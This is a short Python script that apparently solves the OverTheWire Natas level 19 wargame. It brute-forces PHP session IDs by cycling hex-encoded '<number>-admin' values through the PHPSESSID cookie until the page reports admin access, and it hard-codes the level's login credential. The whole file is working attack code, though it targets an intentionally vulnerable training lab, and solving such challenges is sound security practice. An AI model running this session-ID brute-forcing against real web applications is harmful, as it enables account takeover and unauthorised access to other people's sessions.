#!/usr/bin/python

import urllib, requests, string

auth = ("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")
url = "http://natas19.natas.labs.overthewire.org?"

params = {
    "debug": "true",
    "username": "natas20",
    "password": "ffff"
}

x = 0
while True:
    x += 1
    static_id =  "61646d696e" 
    
    id = "3".join(str(x))
    id = "3%s2d%s" % (id, static_id)

    headers = {
        "Cookie": "PHPSESSID=" + id
    }
    print('Trying ID:', id)

    rs = requests.get(url, auth=auth, params={"debug": "true"}, headers=headers)
    if not "Session start ok" in rs.text:
        print("Something went wrong at", id)
        print(rs.text)
    if "You are an admin" in rs.text:
        print(rs.text)
        break
